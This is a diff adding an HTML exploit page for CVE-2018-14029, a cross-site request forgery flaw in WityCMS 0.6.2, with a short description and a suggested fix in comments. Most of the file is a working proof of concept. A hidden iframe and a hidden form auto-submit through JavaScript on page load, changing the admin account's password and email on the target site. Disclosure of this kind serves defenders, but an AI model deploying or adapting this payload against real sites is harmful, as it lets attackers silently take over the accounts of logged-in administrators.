@@ -1,0 +1,48 @@
+<!--
+# Exploit Title: WityCMS 0.6.2 - Cross-Site Request Forgery (Password Change)
+# Vendor Homepage: https://creatiwity.net/witycms
+# Software Link: https://github.com/Creatiwity/wityCMS/releases/tag/0.6.2
+# Exploit Author: Porhai Eung
+# Website: http://www.chhaipov.com
+# CVE: CVE-2018-14029
+# Category: webapps
+
+
+1. Description
+
+CSRF vulnerability in admin/user/edit in Creatiwity wityCMS 0.6.2 allows an attacker to take over a user account by modifying user's data such as email and password
+
+2. Exploit and Proof of Concept
+
+To exploit this vulnerability, victim need to be logged in at target site namely victim.com and visit crafted site made by attacker namely attacker.com. Then an authenticated POST request will be generated from victim browser and it will be submit to victim.com to modify user's data to attacker desired value.
+
+- POC hosted at attacker.com
+-->
+
+</div>
+  <iframe id="test" name="test" style="display:none">
+    </iframe>
+    <form action="http://victim.com/wity/admin/user/edit/1" method="post" id="the_form" style="display:none" target="test">
+        <input type="hidden" name="id" value="1"  />
+        <input type="hidden" name="nickname" value="admin"  />
+        <input type="hidden" name="password" value="csrf123"  />
+        <input type="hidden" name="password_conf" value="csrf123"  />
+        <input type="hidden" name="email" value="csrf@test.com"  />
+        <input type="hidden" name="groupe" value="0"  />
+        <input type="hidden" name="type" value="all"  />
+        <input type="submit" value="Change Password"  />
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var $form = document.getElementById ('the_form');
+        $form.submit ();
+    //]]>
+    </script>
+</div>
+
+<!--
+3. Solution
+
+- Original password is needed in order to change new password of user
+- Implement CSRF token
+-->
